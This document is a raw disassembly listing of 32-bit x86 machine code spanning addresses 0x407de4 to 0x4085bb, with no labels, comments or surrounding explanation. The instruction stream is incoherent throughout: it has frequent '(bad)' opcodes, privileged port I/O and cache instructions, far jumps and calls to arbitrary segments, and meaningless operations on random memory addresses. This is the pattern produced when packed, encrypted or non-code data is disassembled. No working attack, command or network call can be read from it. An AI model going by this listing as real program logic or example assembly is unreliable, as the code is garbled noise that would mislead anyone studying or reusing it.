  407de4:	mov    ds:0x94141777,al
  407de9:	jge    0x407dc4
  407deb:	push   ds
  407dec:	(bad)
  407def:	dec    edi
  407df0:	inc    edi
  407df1:	outs   dx,BYTE PTR ds:[esi]
  407df2:	shl    BYTE PTR [eax+ebx*1],0x61
  407df6:	dec    edx
  407df7:	pushf  
  407df8:	jmp    0x9b6cc3e2
  407dfd:	loopne 0x407e03
  407dff:	cld    
  407e00:	push   ebx
  407e01:	sub    eax,edx
  407e03:	cmp    al,0x76
  407e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e06:	adc    eax,0xd140754c
  407e0b:	mov    ebx,esp
  407e0d:	xchg   ecx,eax
  407e0e:	ins    DWORD PTR es:[edi],dx
  407e0f:	pop    ecx
  407e10:	sbb    esi,DWORD PTR ds:0xb3564164
  407e16:	xchg   esp,eax
  407e17:	push   edi
  407e18:	mov    ecx,0xd0cc8ea1
  407e1d:	lock enter 0xa60d,0x45
  407e22:	icebp  
  407e23:	and    DWORD PTR [ebp+0x1fac6f2b],edi
  407e29:	cld    
  407e2a:	pop    esi
  407e2b:	or     eax,0x62161185
  407e30:	mov    esi,0xee29f5bb
  407e35:	dec    edi
  407e36:	sub    esi,DWORD PTR [ebx-0x7d9e53bc]
  407e3c:	jo     0x407e15
  407e3e:	xor    eax,0x2a5668f1
  407e43:	cmp    DWORD PTR [ebx-0x59],0x3d
  407e47:	(bad)  
  407e48:	loope  0x407e58
  407e4a:	inc    edi
  407e4b:	xlat   BYTE PTR ds:[ebx]
  407e4c:	(bad)  
  407e4d:	jl     0x407e77
  407e4f:	sub    eax,0x4592c0eb
  407e54:	inc    ebp
  407e55:	or     ah,BYTE PTR ds:0x811dd287
  407e5b:	or     ch,BYTE PTR [edi-0x5128c463]
  407e61:	ror    DWORD PTR [esi+0x586f93f9],0x61
  407e68:	aas    
  407e69:	call   0x42e2:0xbe284d47
  407e70:	sub    ah,dh
  407e72:	push   edx
  407e73:	lea    ecx,[ebp-0x3733ba71]
  407e79:	loop   0x407e34
  407e7b:	mov    ch,al
  407e7d:	out    0x82,eax
  407e7f:	js     0x407e8f
  407e81:	out    dx,al
  407e82:	jae    0x407e1a
  407e84:	retf   
  407e85:	js     0x407e40
  407e87:	xchg   ebp,eax
  407e88:	pop    edi
  407e89:	fld    TBYTE PTR [esi]
  407e8b:	sbb    cl,BYTE PTR [esi-0x3f4c2ed8]
  407e91:	int3   
  407e92:	and    BYTE PTR [edx-0x10a2cb0],ah
  407e98:	enter  0x7826,0xb1
  407e9c:	rcr    BYTE PTR [eax-0x619158b3],cl
  407ea2:	xchg   esp,eax
  407ea3:	push   edi
  407ea4:	mov    dh,0x77
  407ea6:	pop    esp
  407ea7:	or     DWORD PTR [edi+0x8ecf91b],ebp
  407ead:	es adc al,0xe9
  407eb0:	shl    BYTE PTR [ebx],1
  407eb2:	das    
  407eb3:	pop    ecx
  407eb4:	fisttp WORD PTR [esi+0x10]
  407eb7:	or     al,0xfa
  407eb9:	inc    esp
  407eba:	(bad)  
  407ebb:	lock in al,0x36
  407ebe:	leave  
  407ebf:	pushf  
  407ec0:	jl     0x407f3d
  407ec2:	test   BYTE PTR [edi-0x37],ch
  407ec5:	and    BYTE PTR [eax],cl
  407ec7:	outs   dx,BYTE PTR ds:[esi]
  407ec8:	push   ebp
  407ec9:	adc    eax,edx
  407ecb:	jecxz  0x407e8b
  407ecd:	in     al,0x81
  407ecf:	push   edi
  407ed0:	rcr    BYTE PTR [edi+0x654ad247],0x8e
  407ed7:	dec    esp
  407ed8:	push   esp
  407ed9:	test   ch,0x74
  407edc:	add    ah,cl
  407ede:	jp     0x407f5c
  407ee0:	pop    edi
  407ee1:	lods   al,BYTE PTR ds:[esi]
  407ee2:	jae    0x407eae
  407ee4:	mov    bh,0xfb
  407ee6:	mov    dh,BYTE PTR [edx+0x42c5838d]
  407eec:	cmp    ebp,edi
  407eee:	xchg   esp,eax
  407eef:	call   0xd42e5490
  407ef4:	inc    eax
  407ef5:	enter  0x11ed,0x64
  407ef9:	leave  
  407efa:	or     edi,edx
  407efc:	fdivr  st,st(1)
  407efe:	retf   
  407eff:	cwde   
  407f00:	or     dl,ch
  407f02:	inc    esp
  407f03:	and    eax,0xbd0557a2
  407f08:	fiadd  DWORD PTR [edx]
  407f0a:	pop    ecx
  407f0b:	xchg   ebp,eax
  407f0c:	fnstcw WORD PTR [ecx-0x7f602f59]
  407f12:	jnp    0x407f5b
  407f14:	js     0x407ea9
  407f16:	dec    ecx
  407f17:	das    
  407f18:	jns    0x407f98
  407f1a:	jae    0x407f59
  407f1c:	(bad)  
  407f1d:	mov    eax,0x773c83e5
  407f22:	fucomp st(2)
  407f24:	cdq    
  407f25:	xchg   BYTE PTR [ebx],al
  407f27:	add    BYTE PTR es:[edi],ah
  407f2a:	push   ebp
  407f2b:	add    al,dh
  407f2d:	(bad)  
  407f2e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f30:	push   edx
  407f31:	and    eax,0x3cf5d484
  407f36:	inc    ebx
  407f37:	ja     0x407fb3
  407f39:	nop
  407f3a:	fisub  WORD PTR [ebx]
  407f3c:	mov    ds:0x670cc6e5,eax
  407f41:	or     dh,0xd8
  407f44:	out    0xea,al
  407f46:	mov    ecx,DWORD PTR [edx+0x3f]
  407f49:	lods   eax,DWORD PTR ds:[esi]
  407f4a:	xor    BYTE PTR [eax],ch
  407f4c:	jne    0x407f8e
  407f4e:	dec    ecx
  407f4f:	(bad)  
  407f51:	jmp    0x9ba:0x999fca4c
  407f58:	and    DWORD PTR [eax],esi
  407f5a:	stc    
  407f5b:	jbe    0x407f44
  407f5d:	cli    
  407f5e:	pop    ebp
  407f5f:	dec    esi
  407f60:	loopne 0x407f43
  407f62:	push   ebx
  407f63:	sbb    bh,BYTE PTR [eax-0x5f5606b8]
  407f69:	int3   
  407f6a:	jmp    0x675b:0x9a57cff9
  407f71:	jne    0x407fc8
  407f73:	test   DWORD PTR [esi],esp
  407f75:	repz fadd QWORD PTR [esi-0x75]
  407f79:	popa   
  407f7a:	jb     0x407f1a
  407f7c:	ror    dh,cl
  407f7e:	or     BYTE PTR [edx+0x5d466450],dl
  407f84:	xchg   edi,eax
  407f85:	leave  
  407f86:	cmp    cl,ah
  407f88:	xchg   ecx,eax
  407f89:	cld    
  407f8a:	sti    
  407f8b:	or     esi,edi
  407f8d:	sbb    eax,0xdc80bc67
  407f92:	aas    
  407f93:	dec    ebp
  407f94:	mov    cl,0x34
  407f96:	add    eax,0x8c198cbe
  407f9b:	sbb    BYTE PTR [ebx-0x4bf34552],cl
  407fa1:	and    DWORD PTR [ebx+0x35ae3129],esi
  407fa7:	aas    
  407fa8:	or     dh,ch
  407faa:	sti    
  407fab:	popf   
  407fac:	push   0x6dfbb3f9
  407fb1:	mov    dh,0xe8
  407fb3:	dec    ecx
  407fb4:	jmp    0x407fd7
  407fb6:	push   ecx
  407fb7:	popf   
  407fb8:	fstp   TBYTE PTR [ebx-0x680fc8b8]
  407fbe:	es inc eax
  407fc0:	lock jmp 0x2e539d8e
  407fc6:	adc    BYTE PTR [ecx+0x4cc84ce2],al
  407fcc:	mov    ds:0xbc6bc6d,al
  407fd1:	pop    esp
  407fd2:	add    dh,BYTE PTR [ebp-0x1302c5ed]
  407fd8:	lods   al,BYTE PTR ds:[esi]
  407fd9:	jnp    0x407fc8
  407fdb:	jns    0x408014
  407fdd:	add    DWORD PTR [edx+0x5e3f5ef4],ebx
  407fe3:	repnz in eax,dx
  407fe5:	mov    ecx,0x75d37717
  407fea:	stc    
  407feb:	mov    esi,0xc0834fd8
  407ff0:	mov    esi,0x142a7cdf
  407ff5:	test   ecx,esp
  407ff7:	xlat   BYTE PTR ds:[ebx]
  407ff8:	(bad)  
  407ff9:	mov    ds:0x73d54c3b,al
  407ffe:	popf   
  407fff:	(bad)  
  408000:	jge    0x40800e
  408002:	sbb    al,0x96
  408004:	or     DWORD PTR [ebx+0x5aa65c53],ecx
  40800a:	stos   BYTE PTR es:[edi],al
  40800b:	adc    ah,BYTE PTR [eax+ebp*1-0x39674b9]
  408012:	xchg   ebp,eax
  408013:	iret   
  408014:	ja     0x408027
  408016:	mov    ebx,0x5d646e96
  40801b:	and    ch,BYTE PTR [esi-0x13]
  40801e:	mov    dh,0x36
  408020:	nop
  408021:	mov    ebx,0xff1eaca9
  408026:	(bad)  
  408027:	push   ebp
  408028:	dec    eax
  408029:	mov    esi,es
  40802b:	imul   edx,DWORD PTR [edi],0xfb9e89ed
  408031:	mov    eax,ds:0x352dd1d9
  408036:	cs mov ebx,0x650e10b5
  40803c:	xlat   BYTE PTR ds:[ebx]
  40803d:	fcomp  DWORD PTR [edi-0x1c]
  408040:	sahf   
  408041:	sar    BYTE PTR [edx+0x2],1
  408044:	in     eax,0x4a
  408046:	lahf   
  408047:	(bad)  
  408048:	or     dh,al
  40804a:	sub    eax,edi
  40804c:	mov    dl,0x23
  40804e:	(bad)  
  40804f:	dec    eax
  408050:	daa    
  408051:	(bad)  
  408052:	shl    edi,1
  408054:	sub    cl,BYTE PTR [ebp+ebp*1+0x6e]
  408058:	test   al,0x5a
  40805a:	inc    edx
  40805b:	imul   esp,DWORD PTR [esi-0x4c],0x878075bf
  408062:	lahf   
  408063:	int3   
  408064:	mov    dh,0x53
  408066:	or     edi,ebp
  408068:	fldenv [esi-0x7c130579]
  40806e:	aaa    
  40806f:	adc    eax,0xc37c4ae7
  408074:	addr16 push es
  408076:	mov    esp,0xfe97c2a0
  40807b:	xchg   DWORD PTR es:[eax+0x6c],edi
  40807f:	mov    bl,0x10
  408081:	push   ss
  408082:	(bad)  
  408083:	mov    ebx,0xb665d01f
  408088:	mov    al,0x8c
  40808a:	sbb    eax,0xaf92022f
  40808f:	ins    DWORD PTR es:[edi],dx
  408090:	lods   eax,DWORD PTR ds:[esi]
  408091:	test   edx,eax
  408093:	inc    ecx
  408094:	sbb    dl,BYTE PTR [ecx+0x59]
  408097:	dec    esi
  408098:	inc    eax
  408099:	or     edx,DWORD PTR [edi]
  40809b:	clc    
  40809c:	test   eax,0x92e5c0b3
  4080a1:	mov    esi,0x1b10ee0d
  4080a6:	adc    al,ch
  4080a8:	(bad)  
  4080a9:	repnz loopne 0x40808b
  4080ac:	push   esi
  4080ad:	and    eax,0xc299ff30
  4080b2:	idiv   BYTE PTR [eax]
  4080b4:	fs cmc 
  4080b6:	and    dl,BYTE PTR [ebx+0x53b1a96e]
  4080bc:	add    DWORD PTR [edi+0xb],eax
  4080bf:	add    ebx,ecx
  4080c1:	ja     0x40811a
  4080c3:	rdtsc  
  4080c5:	dec    eax
  4080c6:	cmp    eax,0x40d0270
  4080cb:	or     al,0xc2
  4080cd:	stos   BYTE PTR es:[edi],al
  4080ce:	xor    DWORD PTR [ebx+0x14],ecx
  4080d1:	mov    eax,0xbd0ed087
  4080d6:	sbb    edi,DWORD PTR [esi]
  4080d8:	inc    edx
  4080d9:	jns    0x4080fd
  4080db:	in     eax,dx
  4080dc:	ja     0x4080b3
  4080de:	sbb    al,BYTE PTR [edi+eiz*2]
  4080e1:	out    0xca,eax
  4080e3:	sbb    esp,DWORD PTR [edx+0x22740657]
  4080e9:	arpl   ax,dx
  4080eb:	test   DWORD PTR [ecx],ecx
  4080ed:	cmp    al,0xa7
  4080ef:	xchg   esi,eax
  4080f0:	inc    ebx
  4080f1:	aaa    
  4080f2:	fsub   QWORD PTR [ebx-0x61]
  4080f5:	mov    bh,0x54
  4080f7:	inc    eax
  4080f8:	stc    
  4080f9:	shr    al,cl
  4080fb:	mov    bl,0x9
  4080fd:	neg    esi
  4080ff:	fistp  QWORD PTR [ecx-0x105dc96c]
  408105:	dec    edi
  408106:	or     eax,0xf9ebd3e9
  40810b:	sar    ebx,cl
  40810d:	push   cs
  40810e:	retf   
  40810f:	shl    DWORD PTR [edi],0xde
  408112:	sbb    ecx,DWORD PTR [esi+0x31818caa]
  408118:	loopne 0x40815a
  40811a:	cmc    
  40811b:	sub    DWORD PTR [ebx-0x34fe344c],0xffffffd5
  408122:	ss cli 
  408124:	shl    ch,1
  408126:	pop    eax
  408127:	inc    ebx
  408128:	and    BYTE PTR [edi],ah
  40812a:	dec    ebp
  40812b:	dec    ebx
  40812c:	sub    eax,0x6447ffac
  408131:	outs   dx,BYTE PTR ds:[esi]
  408132:	gs into 
  408134:	sbb    BYTE PTR [esi],bl
  408136:	(bad)  
  408137:	sbb    ecx,ebp
  408139:	outs   dx,DWORD PTR ds:[esi]
  40813a:	bound  ebx,QWORD PTR [ebx+0x27]
  40813d:	repnz xor cl,al
  408140:	inc    ecx
  408141:	sbb    edi,DWORD PTR [edi+0x2a912070]
  408147:	js     0x4080d5
  408149:	out    0xb7,eax
  40814b:	mov    ebp,0xe9b3ebc8
  408150:	push   esp
  408151:	mov    ebp,edx
  408153:	mov    edx,0x2eda55b
  408158:	xor    BYTE PTR [edx-0x21],bl
  40815b:	mov    cs:0xe007ec6f,eax
  408161:	and    al,0xb6
  408163:	cmp    BYTE PTR [edi-0x54],bh
  408166:	in     eax,0x48
  408168:	aas    
  408169:	adc    eax,0x223049b1
  40816e:	push   esp
  40816f:	addr16 push ebx
  408171:	(bad)  
  408173:	neg    dh
  408175:	call   0xfb97:0x20c9c204
  40817c:	out    0x28,eax
  40817e:	push   esp
  40817f:	pop    esp
  408180:	pop    edi
  408181:	adc    eax,esi
  408183:	inc    esp
  408184:	js     0x408154
  408186:	lock cmp eax,0x7c4075ce
  40818c:	sub    BYTE PTR ds:0x6d8c4419,al
  408192:	fmul   st,st(5)
  408194:	mov    al,ds:0xebd78225
  408199:	add    DWORD PTR [ecx+0x5d],ecx
  40819c:	fistp  QWORD PTR [ebx+ecx*1]
  40819f:	cmp    al,BYTE PTR [ecx]
  4081a1:	aas    
  4081a2:	dec    esp
  4081a3:	jge    0x408200
  4081a5:	xlat   BYTE PTR ds:[ebx]
  4081a6:	mov    edx,eax
  4081a8:	pop    ecx
  4081a9:	jae    0x4081ac
  4081ab:	imul   ebp,DWORD PTR [ecx],0x9c4dbf9c
  4081b1:	inc    esp
  4081b2:	rcl    DWORD PTR [edx-0x54],0x29
  4081b6:	scas   al,BYTE PTR es:[edi]
  4081b7:	mov    ds:0x80413c4e,al
  4081bc:	xchg   ecx,eax
  4081bd:	cmp    eax,esi
  4081bf:	jo     0x4081fb
  4081c1:	and    eax,0xc5c8f13b
  4081c6:	mov    al,0x4
  4081c8:	stos   BYTE PTR es:[edi],al
  4081c9:	or     edx,0xb
  4081cc:	jnp    0x40821b
  4081ce:	jmp    0xd2b7:0x5dc9d4a9
  4081d5:	mov    ebx,0x52294ab9
  4081da:	xor    al,0xb2
  4081dc:	cmp    dl,BYTE PTR [edi+0x1d279d0e]
  4081e2:	push   eax
  4081e3:	adc    dh,BYTE PTR [ebx+eiz*1]
  4081e6:	inc    ebx
  4081e7:	dec    eax
  4081e8:	neg    cl
  4081ea:	xchg   esp,eax
  4081eb:	jae    0x4081bf
  4081ed:	les    edx,FWORD PTR ss:[esi+0x74]
  4081f1:	add    al,0x2b
  4081f3:	xchg   DWORD PTR [edi-0x39bb5bea],ebx
  4081f9:	fadd   DWORD PTR [eax+ecx*1]
  4081fc:	enter  0xcaaa,0x79
  408200:	add    ch,BYTE PTR ds:0x4b156bb3
  408206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408207:	shl    DWORD PTR [esi-0x208f0ad4],0x96
  40820e:	addr16 pop ds
  408210:	into   
  408211:	ja     0x408199
  408213:	les    ebx,FWORD PTR [esi-0x5e14b0cc]
  408219:	retf   0x5c43
  40821c:	and    eax,0x1374386b
  408221:	mov    ss,WORD PTR [ebp-0x6d]
  408224:	pop    ss
  408225:	or     al,0x98
  408227:	pusha  
  408228:	lahf   
  408229:	mov    bh,0xcd
  40822b:	out    0x31,eax
  40822d:	xchg   ecx,eax
  40822e:	js     0x4081eb
  408230:	jmp    0x4081f5
  408232:	(bad)  
  408233:	jmp    0xc54ba19b
  408238:	lods   eax,DWORD PTR ds:[esi]
  408239:	retf   0x6ead
  40823c:	(bad)  
  40823d:	retf   0xd743
  408240:	idiv   DWORD PTR [ebp-0x1a]
  408243:	mov    esi,0xd008eb6d
  408248:	repz add eax,0x44e1e34d
  40824e:	jmp    0x408298
  408250:	sbb    dh,BYTE PTR [eax]
  408252:	mov    ecx,0x35524e37
  408257:	sbb    edi,DWORD PTR [esi]
  408259:	add    BYTE PTR [edx+eax*1],bh
  40825c:	push   0x5f8b6df3
  408261:	stc    
  408262:	xchg   edx,eax
  408263:	inc    esp
  408264:	in     eax,0x44
  408266:	add    ah,ah
  408268:	sahf   
  408269:	jmp    0x4082d6
  40826b:	inc    edx
  40826c:	mov    BYTE PTR [eax+0x49],cl
  40826f:	loopne 0x40827d
  408271:	xchg   esp,eax
  408272:	mov    al,ds:0xa58bff10
  408277:	fisttp DWORD PTR [edx]
  408279:	lahf   
  40827a:	popa   
  40827b:	imul   eax,ebx,0x17d0ce76
  408281:	xchg   esi,eax
  408282:	dec    edi
  408283:	aaa    
  408284:	(bad)  
  408285:	adc    dh,BYTE PTR [esi-0x10]
  408288:	invd   
  40828a:	ds sub dl,bl
  40828d:	mov    ds:0xcd331f80,eax
  408292:	repz pop ebx
  408294:	push   eax
  408295:	dec    ecx
  408296:	dec    ebp
  408297:	daa    
  408298:	in     al,dx
  408299:	xor    DWORD PTR [edx-0x57],esi
  40829c:	inc    ebx
  40829d:	call   0x506b:0x5791a850
  4082a4:	dec    ebp
  4082a5:	inc    eax
  4082a6:	sub    esi,DWORD PTR [edx]
  4082a8:	cdq    
  4082a9:	cmc    
  4082aa:	stc    
  4082ab:	shl    bh,cl
  4082ad:	inc    ecx
  4082ae:	out    0x26,eax
  4082b0:	cmp    esi,DWORD PTR [eax+0x7f]
  4082b3:	lock mov edi,0x144d94dd
  4082b9:	add    eax,0x804a628a
  4082be:	jmp    0x408287
  4082c0:	jg     0x4082fa
  4082c2:	cmp    BYTE PTR [ecx+0x78],ch
  4082c5:	das    
  4082c6:	xor    DWORD PTR [edx],esi
  4082c8:	fs mov ch,0xab
  4082cb:	cmp    DWORD PTR [ebp-0x34d796c0],0x4a
  4082d2:	adc    bh,BYTE PTR [eax]
  4082d4:	stc    
  4082d5:	ds push ebp
  4082d7:	adc    edx,DWORD PTR [esi+0x52]
  4082da:	mov    bl,BYTE PTR [ebp-0x2e0f5352]
  4082e0:	add    eax,DWORD PTR [esi-0x54]
  4082e3:	pop    ds
  4082e4:	cmp    DWORD PTR [ecx],eax
  4082e6:	cmp    bh,0x53
  4082e9:	xchg   BYTE PTR [edx+0x3e],al
  4082ec:	dec    eax
  4082ed:	ds xor edx,ebp
  4082f0:	sahf   
  4082f1:	lods   eax,DWORD PTR ds:[esi]
  4082f2:	sub    al,0x8c
  4082f4:	add    cl,BYTE PTR [edx+0x4]
  4082f7:	xchg   esp,eax
  4082f8:	jecxz  0x40828e
  4082fa:	pop    esp
  4082fb:	xchg   esp,eax
  4082fc:	jl     0x4082c8
  4082fe:	in     eax,0x6d
  408300:	xchg   ebx,eax
  408301:	mov    cl,BYTE PTR [edx+0x67]
  408304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408305:	xor    DWORD PTR [edi+eiz*4-0x30],ebp
  408309:	loopne 0x4082f1
  40830b:	es pop ecx
  40830d:	shl    BYTE PTR [eax],cl
  40830f:	xor    eax,ecx
  408311:	gs pop esp
  408313:	daa    
  408314:	push   cs
  408315:	xchg   esp,eax
  408316:	jp     0x408338
  408318:	clc    
  408319:	or     ah,ch
  40831b:	sbb    bh,BYTE PTR [eax]
  40831d:	sub    cl,BYTE PTR [eax-0x62aef99b]
  408323:	pop    esi
  408324:	cli    
  408325:	nop
  408326:	sbb    al,0x7e
  408328:	into   
  408329:	inc    esp
  40832a:	enter  0x5823,0x8c
  40832e:	sahf   
  40832f:	adc    ecx,edi
  408331:	mov    ah,ah
  408333:	out    0xc7,eax
  408335:	rol    BYTE PTR [esp+esi*8+0x754e419d],cl
  40833c:	das    
  40833d:	loope  0x4082e0
  40833f:	mov    edi,0x48c29787
  408344:	sbb    BYTE PTR [edx-0xb],bl
  408347:	cwde   
  408348:	cld    
  408349:	fist   DWORD PTR [edi-0x43]
  40834c:	test   BYTE PTR [ecx+eiz*4+0x5461eb62],al
  408353:	pop    ecx
  408354:	or     bh,BYTE PTR [ebx-0x1d]
  408357:	dec    edx
  408358:	add    al,0x75
  40835a:	nop
  40835b:	sub    BYTE PTR [esi],cl
  40835d:	ret    0xc44d
  408360:	xor    al,0xcf
  408362:	mov    eax,ds:0x19d820e2
  408367:	jle    0x4083b5
  408369:	out    0xb0,al
  40836b:	push   ebx
  40836c:	fnstenv [ecx+0x3a]
  40836f:	xchg   edi,eax
  408370:	(bad)  
  408371:	sub    BYTE PTR [eax-0x3f],ch
  408374:	loop   0x408363
  408376:	adc    eax,0x497caba
  40837b:	retf   
  40837c:	out    0xc7,al
  40837e:	mov    ah,0x98
  408380:	icebp  
  408381:	loope  0x408402
  408383:	outs   dx,BYTE PTR ds:[esi]
  408384:	loop   0x408322
  408386:	retf   
  408387:	rcr    bl,0x93
  40838a:	add    bh,BYTE PTR [ebx-0x8]
  40838d:	jge    0x408311
  40838f:	adc    eax,0x3144b6d8
  408394:	in     al,dx
  408395:	xchg   ebx,eax
  408396:	add    BYTE PTR [edx-0x3529bcb1],0x57
  40839d:	cmp    al,BYTE PTR [esi+0x17]
  4083a0:	add    esi,edi
  4083a2:	test   ch,ch
  4083a4:	inc    ecx
  4083a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083a6:	dec    esp
  4083a7:	xlat   BYTE PTR ds:[ebx]
  4083a8:	or     eax,0x7e26ca87
  4083ad:	mov    dl,0x5a
  4083af:	in     eax,dx
  4083b0:	cmp    al,0xbb
  4083b3:	add    eax,0xea50f1c0
  4083b8:	inc    eax
  4083b9:	cmp    eax,0x7073c652
  4083be:	cld    
  4083bf:	jecxz  0x408371
  4083c1:	cmp    ch,bh
  4083c3:	adc    eax,0xab1d8461
  4083c8:	(bad)  [esi+0xf84a8d5]
  4083ce:	(bad)  
  4083cf:	(bad)  
  4083d0:	imul   ebx,DWORD PTR [eax+0x2900ae45],0x79
  4083d7:	popf   
  4083d8:	(bad)  
  4083d9:	(bad)  [edx-0x53]
  4083dc:	jmp    0xcfcd:0xd49240d
  4083e3:	mov    DWORD PTR [ecx+0x64],edx
  4083e6:	std    
  4083e7:	mov    cl,BYTE PTR [ecx+ecx*8+0x2b3b7935]
  4083ee:	mov    ebp,0x3f9bf504
  4083f3:	enter  0x568e,0x66
  4083f7:	mov    bl,0x4f
  4083f9:	and    eax,0x772e3fcd
  4083fe:	ins    DWORD PTR es:[edi],dx
  4083ff:	mov    esp,0x2aa24e23
  408404:	test   DWORD PTR [esi],edi
  408406:	pop    edx
  408407:	ficomp WORD PTR [esi]
  408409:	jae    0x40845a
  40840b:	sahf   
  40840c:	daa    
  40840d:	or     BYTE PTR [edx+0x41],0xff
  408411:	div    DWORD PTR [ebx]
  408413:	jle    0x408429
  408415:	inc    edi
  408416:	in     eax,dx
  408417:	shl    DWORD PTR [edx-0x2c],1
  40841a:	dec    edx
  40841b:	jbe    0x4083d6
  40841d:	mov    esp,0x91274d31
  408422:	push   edx
  408423:	mov    dl,0xfa
  408425:	push   ebx
  408426:	test   eax,0xed15c38a
  40842b:	stos   BYTE PTR es:[edi],al
  40842c:	jmp    0xeda6:0x8e58659c
  408433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408434:	mov    esi,0x18a7f690
  408439:	add    eax,DWORD PTR [edi+0x31]
  40843c:	(bad)  
  40843e:	fisttp QWORD PTR [ebx-0x7643730a]
  408444:	fwait
  408445:	adc    al,0x1
  408447:	pop    ds
  408448:	stos   BYTE PTR es:[edi],al
  408449:	dec    ebp
  40844a:	push   0x20
  40844c:	push   es
  40844d:	adc    edx,0x78
  408450:	pop    ss
  408451:	leave  
  408452:	std    
  408453:	sbb    BYTE PTR [ebx],cl
  408455:	das    
  408456:	inc    eax
  408457:	sti    
  408458:	popa   
  408459:	jne    0x4084ae
  40845b:	sub    bl,dh
  40845d:	dec    eax
  40845e:	push   cs
  40845f:	outs   dx,DWORD PTR ds:[esi]
  408460:	mov    cs,eax
  408462:	pusha  
  408463:	adc    al,0x1c
  408465:	cmp    eax,0x68fe9b1d
  40846a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40846b:	int3   
  40846c:	arpl   WORD PTR [edx-0x6c],bp
  40846f:	addr16 imul ebp
  408472:	enter  0x5c8d,0x6b
  408476:	push   cs
  408477:	push   cs
  408478:	dec    edx
  408479:	jmp    0x4084a8
  40847b:	das    
  40847c:	hlt    
  40847d:	and    BYTE PTR [eax-0x6],0x8c
  408481:	inc    edx
  408482:	enter  0x10ec,0x21
  408486:	bnd jg 0x40847a
  408489:	repz rcr DWORD PTR [edx+0x7c5e9b90],cl
  408490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408491:	into   
  408492:	push   edx
  408493:	or     DWORD PTR [esi],eax
  408495:	push   0xffffff89
  408497:	sbb    DWORD PTR [ebp+ecx*4-0x1b],ebp
  40849b:	cli    
  40849c:	add    BYTE PTR [edx+0x63],dh
  40849f:	pop    esi
  4084a0:	ja     0x408443
  4084a2:	fwait
  4084a3:	push   esp
  4084a4:	cmp    BYTE PTR [esi],bl
  4084a6:	and    edx,esi
  4084a8:	sub    BYTE PTR [esi],ah
  4084aa:	pop    esi
  4084ab:	shl    DWORD PTR [edx],cl
  4084ad:	pop    DWORD PTR [edi+0x3f38ad6c]
  4084b3:	ror    DWORD PTR [ebp-0x40d0aa34],0xec
  4084ba:	fdiv   DWORD PTR [ebx+0x61624bbf]
  4084c0:	mov    al,ds:0x668c9e3b
  4084c5:	cmp    al,0xde
  4084c7:	mov    al,0xdb
  4084c9:	jl     0x40847d
  4084cb:	pop    eax
  4084cc:	mov    al,0x33
  4084ce:	hlt    
  4084cf:	stos   DWORD PTR es:[edi],eax
  4084d0:	sub    al,al
  4084d2:	pusha  
  4084d3:	pop    edx
  4084d4:	push   edx
  4084d5:	mov    edx,ebp
  4084d7:	jp     0x40851f
  4084d9:	sbb    DWORD PTR [ebp-0x4d],edi
  4084dc:	dec    eax
  4084dd:	adc    eax,0x6d293b02
  4084e2:	mov    ecx,0x9bab5ecb
  4084e7:	arpl   WORD PTR [ebp+0x6e],bp
  4084ea:	inc    edi
  4084eb:	inc    edx
  4084ec:	push   esi
  4084ed:	adc    BYTE PTR [eax+0x70],0xfe
  4084f1:	dec    ebp
  4084f2:	mov    cl,0x3b
  4084f4:	fld    DWORD PTR [edi+edi*1+0x39]
  4084f8:	dec    edi
  4084f9:	and    eax,0xf3f17ab1
  4084fe:	mov    dh,0xee
  408500:	bound  ecx,QWORD PTR [ecx+0x37a83762]
  408506:	aas    
  408507:	pop    ss
  408508:	jmp    0x408499
  40850a:	ja     0x4084f2
  40850c:	ret    
  40850d:	push   ss
  40850e:	xor    al,0xb5
  408510:	fld    DWORD PTR [eax+edi*1+0x30]
  408514:	into   
  408515:	dec    esp
  408516:	stos   BYTE PTR es:[edi],al
  408517:	or     DWORD PTR [edx+0x7f00122f],ebp
  40851d:	dec    ecx
  40851e:	xchg   DWORD PTR [eax-0x17ee7bf8],esp
  408524:	xor    BYTE PTR [esi-0x1826fbaa],cl
  40852a:	cmp    BYTE PTR [ecx],dl
  40852c:	jecxz  0x4084d0
  40852e:	dec    esp
  40852f:	sbb    al,0x60
  408531:	and    DWORD PTR [ebx],edx
  408533:	xor    ecx,esp
  408535:	mov    ch,0x48
  408537:	push   0xd36819ac
  40853c:	rcr    ch,0x4b
  40853f:	jno    0x408510
  408541:	test   DWORD PTR [edx+0x4706a3e7],edx
  408547:	mov    esp,0x6a9d46d0
  40854c:	pop    ebp
  40854d:	push   esi
  40854e:	xchg   ecx,eax
  40854f:	dec    ecx
  408550:	and    BYTE PTR [edx-0x30],ah
  408553:	ret    
  408554:	pop    edx
  408555:	push   cs
  408556:	gs in  eax,0x32
  408559:	mov    cl,0x10
  40855b:	and    al,0x2f
  40855d:	sahf   
  40855e:	clc    
  40855f:	adc    BYTE PTR [ebx-0x8],0xaa
  408563:	push   ecx
  408564:	in     al,0x81
  408566:	fiadd  WORD PTR [ebp-0x22a12e10]
  40856c:	mov    ch,0x8a
  40856e:	lds    ebx,FWORD PTR [eax]
  408570:	adc    ch,BYTE PTR [ecx]
  408572:	pop    ebp
  408573:	cli    
  408574:	add    al,0xf9
  408576:	xchg   edx,eax
  408577:	cmp    BYTE PTR [edi-0x1a2c63a5],ch
  40857d:	out    0xac,al
  40857f:	jns    0x4085d4
  408581:	ins    BYTE PTR es:[edi],dx
  408582:	jmp    0x408534
  408584:	ret    0x837a
  408587:	add    al,0xb0
  408589:	sbb    DWORD PTR ss:[ecx-0x59],ebx
  40858d:	sbb    eax,0xb56417f0
  408592:	das    
  408593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408594:	iret   
  408595:	mov    al,ds:0xa2460fa0
  40859a:	jp     0x408526
  40859c:	jb     0x4085f2
  40859e:	dec    edx
  40859f:	dec    ebp
  4085a0:	into   
  4085a1:	sbb    ebp,DWORD PTR [edi+eax*2+0x5e60c1f3]
  4085a8:	fcom   QWORD PTR [ebx]
  4085aa:	stc    
  4085ab:	adc    eax,0x1bfd3fe
  4085b0:	sbb    bl,BYTE PTR [ebx]
  4085b2:	pop    edi
  4085b3:	xor    eax,DWORD PTR [bx]
  4085b6:	fs mov al,0x9d
  4085b9:	sbb    al,0xe0
  4085bb:	mov    esi,0xa865bc07
